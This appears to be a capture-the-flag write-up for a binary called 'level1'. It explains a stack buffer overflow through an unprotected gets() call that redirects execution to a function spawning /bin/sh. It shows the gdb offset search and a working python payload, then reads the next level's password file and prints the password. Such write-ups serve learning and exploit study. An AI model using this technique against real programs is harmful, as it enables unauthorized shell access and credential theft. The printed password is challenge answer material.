# Level1

This binary has a `run()` function that calls `/bin/sh`, however it is not called by `main()`
There is an unprotected `gets()` `in main()` that will allow us to perform a *buffer overflow attack*
This will consist of writing up on the stack by inputing more characters in gets() than the available buffer size
By overwriting the RET value with the address of run() we can force its execution

Using the pattern generator at https://wiremask.eu/tools/buffer-overflow-pattern-generator/ we can find exactly at what offset to write the address after the buffer

``
gdb level1
(gdb) r
(gdb) Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()	; offset 76
``

``
python -c "print 76 * 'a' + '\x08\x04\x84\x44'[::-1]" > /tmp/inj1
cat /tmp/inj1 - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
``
